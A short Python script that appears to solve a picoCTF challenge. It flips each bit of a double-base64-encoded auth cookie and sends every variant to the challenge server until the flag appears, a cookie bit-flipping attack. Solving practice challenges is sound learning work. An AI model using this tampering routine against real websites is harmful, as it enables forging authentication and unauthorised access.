import base64
import requests

encoded = "M3ZvVTZUZEwxZHAzSFZKbkRHbEFTbzNyTGlDZ1RSKzZtS09IVmJOazdTcTZBc212MjBubzJVUG5VakNVTWovVWxNUUR5WGNqU0VNOEluNithVjJUWkpwRG9jUlRQSHdSOHdwTEwwQm1kVmM5U0Z3WVp5WG1xL0Vab0orbkxWVHA="
decoded = base64.b64decode(encoded)
decoded = base64.b64decode(decoded)

for i in range(0,len(decoded)):
    for j in range(0,8):
        x = 1 << j
        cookie = decoded[0:i] + (decoded[i]^x).to_bytes(1, 'big') + decoded[i+1:]
        cookie = {'auth_name': base64.b64encode(base64.b64encode(cookie)).decode()}
        r = requests.get('http://mercury.picoctf.net:34962/', cookies=cookie)
        if "pico" in r.text:
            print("found it!", r.text)
            break